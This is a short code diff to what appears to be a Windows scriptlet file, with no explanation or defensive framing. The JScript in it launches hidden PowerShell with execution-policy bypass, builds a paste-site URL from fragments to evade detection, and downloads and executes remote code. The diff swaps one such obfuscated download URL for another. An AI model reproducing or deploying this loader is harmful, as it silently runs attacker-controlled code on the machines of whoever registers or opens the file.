@@ -6,7 +6,7 @@
     <script language="JScript">
       <![CDATA[
         var shell = new ActiveXObject("WScript.Shell");
-        shell.Run("powershell.exe -windowstyle hidden -nop -exec bypass -c \"$w=New-Object Net.WebClient;$u=('https'+'://nopas'+'te.net/'+'Hu'+'JXMl'+'fuui');IEX $w.DownloadString($u)\"");
+        shell.Run("powershell.exe -windowstyle hidden -nop -exec bypass -c \"$w=New-Object Net.WebClient;$u=('https'+'://nopas'+'te.net/vu'+'Pp'+'xm'+'Y1bq');IEX $w.DownloadString($u)\"");
       ]]>
     </script>
   </registration>
